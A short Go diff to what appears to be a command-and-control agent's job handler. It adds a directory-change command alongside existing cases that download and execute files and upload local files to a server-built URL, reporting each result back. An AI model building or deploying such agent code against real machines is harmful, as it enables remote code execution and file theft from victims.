@@ -181,12 +181,17 @@ func (w *Worker) resolve(job Job) {
 			w.report(job.Id, "File downloaded and executed.")
 		}
 	case UPLOAD:
-		filePath := args[0]
 		destUrl := buildRequestUrl(UPLOADS, w.id, "")
-		if err := utils.UploadFile(filePath, destUrl); err != nil {
+		if err := utils.UploadFile(args[0], destUrl); err != nil {
 			w.report(job.Id, err.Error())
 		} else {
 			w.report(job.Id, "File uploaded to "+destUrl)
+		}
+	case CHDIR:
+		if err := os.Chdir(args[0]); err != nil {
+			w.report(job.Id, err.Error())
+		} else {
+			w.report(job.Id, "Directory changed to "+args[0])
 		}
 	case UNKNOWN:
 		w.report(job.Id, "Received job has wrong format.")
